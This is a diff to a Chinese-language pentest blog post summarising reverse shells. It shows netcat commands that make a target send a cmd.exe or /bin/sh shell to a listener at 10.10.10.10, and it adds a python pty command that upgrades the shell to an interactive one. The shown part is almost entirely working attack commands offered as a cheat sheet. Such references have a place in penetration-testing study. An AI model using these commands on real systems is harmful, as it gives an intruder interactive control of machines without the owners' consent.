@@ -2,7 +2,7 @@
 date = "2016-08-06T08:36:53+08:00"
 description = ""
 draft = false
-tags = ["intranet"]
+tags = ["反弹shell"]
 title = "反弹shell小结"
 topics = ["Pentest"]
 
@@ -21,6 +21,9 @@ topics = ["Pentest"]
 ```
 本地：nc -vv -l 8888
 目标：nc -e cmd.exe 10.10.10.10 8888 #nc -e /bin/sh 10.10.10.10 8888
+
+#获得交互式的shell：
+在得到shell后执行：python -c "import pty; pty.spawn('/bin/bash')"
 ```
 
 ### 0x02 Bash
